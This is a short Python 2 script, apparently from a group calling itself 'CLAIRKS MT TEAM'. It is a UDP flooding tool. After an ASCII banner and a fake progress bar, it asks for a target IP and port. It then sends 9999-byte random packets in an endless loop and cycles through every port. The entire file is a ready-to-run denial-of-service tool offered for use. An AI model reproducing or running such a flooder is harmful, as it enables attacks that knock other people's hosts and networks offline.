import sys
import os
import time
import socket
import random
#by_obaida
#############:
W = '\033[1;34;40m'
Br = '\033[1;32;40m'
Bg = '\033[1;31;40m'
Y = '\033[1;32;40m'
Bb = '\033[1;32;40m'
Bm = '\033[1;32;40m'
Bc = '\033[1;32;40m'
M = '\033[1;34m'
C = '\033[1;31m'
D = '\033[1;32m'
#################
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(9999)
#############

os.system("clear")
print(C)
print("                   |=============================|")
print(D)
print("                         |=================|")
print(W)
print("                             |=========|")
print(M)
print("  ____ _        _    ___ ____  _  ______    __  __ _____")
print(" / ___| |      / \  |_ _|  _ \| |/ / ___|  |  \/  |_   _|")
print("| |   | |     / _ \  | || |_) | ' /\___ \  | |\/| | | |")
print("| |___| |___ / ___ \ | ||  _ <| . \ ___) | | |  | | | |")
print(" \____|_____/_/   \_\___|_| \_\_|\_\____/  |_|  |_| |_|")

print("                               |=====|")
print(Br)
print("                                |===|")
print("\r")
print(C)
print("                        By ==>   CLAIRKS MT TEAM ")

print(D)

print("                     WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW")
print(W)

print
ip = raw_input("Enter IP  : ")
port = input("Enter Port  : ")
os.system("clear")
os.system("figlet LITS PLAY HAHA")

print(C)
print "[                    ] 0% "
time.sleep(1)
print "[=====               ] 25%"
time.sleep(2)
print "[==========          ] 50%"
time.sleep(1)
print "[===============     ] 75%"
time.sleep(1)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s LETS PLAY HAHA  %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
